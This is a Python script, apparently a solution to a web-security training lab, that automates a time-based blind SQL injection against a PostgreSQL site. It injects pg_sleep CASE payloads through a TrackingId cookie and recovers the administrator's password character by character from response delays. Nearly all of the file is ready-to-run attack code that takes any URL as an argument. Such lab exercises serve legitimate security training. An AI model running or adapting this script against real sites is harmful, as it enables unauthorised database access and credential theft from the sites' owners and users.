# Blind SQL Injection with Time Delays and Information Retrieval
# Purpose of the lab is to retrieve admin's password using by triggering time delays

import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def retrieve_admin_password_by_triggering_time_delay(url):
    admin_password =""
    alphanumeric_list = ['0','1','2','3','4','5','6','7','8','9',
                        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
                        'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                        'u', 'v', 'w', 'x', 'y', 'z']
    
    # We figured out the lenght of the password already using this payload manually 
    # '||(SELECT CASE WHEN length(password) = 20 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
    # You can test with it to make sure password's length is 20 characters long and you can as well write a function to test automatically, similar to the one I implemented in the previous lab below::
    #  https://github.com/KholoudAhmedx/automating_sql_injection_attacks/blob/main/sqli-lab-13.py 
    # NOTE: change the value of the tracking id, as well as the conditions in the CASE state + if condition to be as the ones i provide here.

    # Knowing that the password is already 20 chars & as well assuming password contains only lowercase, alphanumeric chars

    for i in range(1, 21):
        for char in alphanumeric_list:
            payload = "'||(SELECT CASE WHEN SUBSTR(password,%i,1) LIKE '%s' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--" %(i, char)
            cookies = {
                "TrackingId": "bO8SjPHp6Q9YV0Ze"+payload
            }
            req = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if req.elapsed.total_seconds() > 10:
                # Then time delay occurs 
                # Then we can retrieve admin password's chars one by one
                admin_password+=char
                break

    return admin_password

if __name__ == '__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage %s <url>" %sys.argv[0])
        print("[-] Example %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    
    print("[+] Figuring out the password of the admin..")
    admin_password = retrieve_admin_password_by_triggering_time_delay(url)
    if admin_password:
        print("[+] The password of the admin is: %s" %admin_password)
        print("[+] Attack successed.")
    else:
        print("[-] Attack failed..")
